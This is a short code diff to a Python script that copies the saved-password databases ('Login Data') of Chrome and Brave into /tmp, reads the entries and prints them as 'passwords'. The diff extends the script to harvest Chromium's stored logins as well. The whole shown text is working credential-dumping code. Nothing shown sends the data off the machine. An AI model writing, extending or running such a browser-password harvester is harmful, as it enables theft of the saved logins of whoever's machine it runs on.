@@ -7,6 +7,8 @@ temp = "/tmp/LoginData"
 
 chrome = os.path.expanduser("~/.config/google-chrome/Default/Login Data") 
 
+chromium = os.path.expanduser("~/.config/chromium/Default/Login Data")
+
 brave = os.path.expanduser("~/.config/BraveSoftware/Brave-Browser/Default/Login Data") 
 
 def read_entries_tmp_logindata():
@@ -45,6 +47,12 @@ if os.path.exists(chrome):
     # Copy the database first since Chrome locks it while running
     print("Chrome passwords:")
     shutil.copy2(chrome, temp)
+    read_entries_tmp_logindata() 
+    os.remove(temp) 
+
+if os.path.exists(chromium):
+    print("Chromium passwords:")
+    shutil.copy2(chromium, temp)
     read_entries_tmp_logindata() 
     os.remove(temp) 
 
